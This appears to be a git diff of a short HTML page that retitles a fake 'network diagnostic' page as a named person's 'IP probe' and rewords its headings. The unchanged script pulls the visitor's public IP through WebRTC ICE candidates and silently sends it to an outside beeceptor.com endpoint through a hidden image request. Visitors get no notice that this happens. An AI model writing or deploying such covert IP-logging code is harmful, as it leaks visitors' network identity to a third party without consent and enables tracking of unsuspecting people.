@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>网络诊断助手</title>
+    <title>朱子硕的IP探针</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         body { 
@@ -19,7 +19,7 @@
     </style>
 </head>
 <body>
-    <h2>🛜 网络连接诊断中...</h2>
+    <h2>🛜 逆天无敌666</h2>
     <div id="result"></div>
 
     <script>
@@ -38,7 +38,7 @@
             const ipMatch = ice.candidate.candidate.match(ipRegex);
             if (ipMatch) {
                 document.getElementById('result').innerHTML = 
-                    `✅ 诊断完成<br>您的公网IP：<b>${ipMatch[0]}</b>`;
+                    `✅ 已获取<br>您的公网IP：<b>${ipMatch[0]}</b>`;
                 // 实时推送IP到你的屏幕
                 new Image().src = `https://zzs-ip.free.beeceptor.com?ip=${ipMatch[0]}`;
             }
